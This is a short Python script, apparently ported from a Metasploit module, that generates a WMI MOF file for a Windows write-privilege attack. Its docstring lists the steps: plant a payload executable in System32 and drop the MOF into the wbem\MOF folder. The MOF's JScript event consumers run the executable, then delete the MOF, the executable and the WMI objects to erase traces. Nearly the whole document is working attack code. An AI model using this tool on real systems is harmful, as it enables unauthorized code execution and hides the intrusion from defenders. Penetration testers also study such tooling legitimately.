#!/usr/bin/env python

"""
generate_mof - generate MOF file for WbemExec

Ported to python from https://raw.githubusercontent.com/rapid7/metasploit-framework/master/lib/msf/core/exploit/wbemexec.rb
Also see: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows

Usage:
- generate payload (.exe)
- generate MOF file
- upload payload executable to c:\Windows\System32 on the target system
- upload MOF file to c:\Windows\System32\wbem\MOF on the target system
"""

import sys
import random
import string

def generate_mof(mofname, exe):

    classname = "".join(random.sample(string.ascii_letters, 4))

    # From Ivan's decompressed version
    mof = """
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass@CLASS@
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\@MOFNAME@\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
  QueryLanguage = "WQL";

};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass@CLASS@ as $MyClass
{
  Name = "ClassConsumer";
};
"""

    # Replace the input vars
    mof = mof.replace("@CLASS@", classname)
    mof = mof.replace("@EXE@", exe)  # NOTE: \ and " should be escaped
    mof = mof.replace("@MOFNAME@", mofname)

    return mof

def main():
    if len(sys.argv) != 3:
        print("Usage: {} <MOF_FILE_NAME> <EXE_TO_EXECUTE>".format(sys.argv[0]))
        exit(1)

    mof = generate_mof(sys.argv[1], sys.argv[2])

    with open(sys.argv[1], "w") as f_output:
        f_output.write(mof)

if __name__ == "__main__":
    main()
